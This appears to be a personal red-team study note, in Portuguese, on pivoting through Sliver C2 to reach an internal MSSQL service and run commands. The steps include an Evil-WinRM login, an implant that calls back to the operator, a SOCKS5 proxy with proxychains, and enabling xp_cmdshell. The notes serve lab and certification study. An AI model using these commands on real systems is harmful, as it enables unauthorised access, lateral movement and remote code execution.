> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/sliver-c2/pivoting-and-persistence/exposing-internal-ports.md).

# Exposing Internal Ports

#### Objetivo

Acessar serviços internos (não expostos externamente) usando pivoting via Sliver C2.

**Acesso inicial (Windows)**

```
evil-winrm -u alice.wonderland -p 'HackSmarter123' -i <TARGET_IP>
```

**Enumerar serviços internos**

```
netstat -ano | findstr "127.0.0.1"
```

Identifica:

* Serviços rodando apenas em **localhost (127.0.0.1)**
* Exemplo:
  * Porta **1433 → MSSQL**

Insight:

* Porta não aparece em scans externos (ex: nmap)
* Só acessível internamente

**Pivoting com Sliver**

**Gerar implant**

```
generate --mtls <SEU_IP>:443 --os windows
```

**Transferir e executar**

* Upload via Evil-WinRM
* Executar o `.exe`
* Nova sessão aparece no Sliver

**Criar proxy SOCKS5**

```
use <SESSION_ID>
socks5 start
```

Resultado:

* Proxy SOCKS5 ativo (porta padrão: **1081**)

**Configurar Proxychains**

Editar:

```
/etc/proxychains4.conf
```

Adicionar no final:

```
socks5 127.0.0.1 1081
```

**Acessar serviço interno (MSSQL)**

```
proxychains -q impacket-mssqlclient '<DOMAIN>/<USER>:<PASS>@127.0.0.1' -windows-auth
```

Importante:

* `127.0.0.1` → proxy redireciona para o alvo real
* Acesso ao serviço interno via túnel
* Enumerar o dominio

```
$ADClass = [System.DirectoryServices.ActiveDirectory.Domain]
$ADClass::GetCurrentDomain()
```

**Execução remota via MSSQL**

**Habilitar xp\_cmdshell**

```
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

&#x20;**Executar comando**

```
xp_cmdshell 'whoami'
```
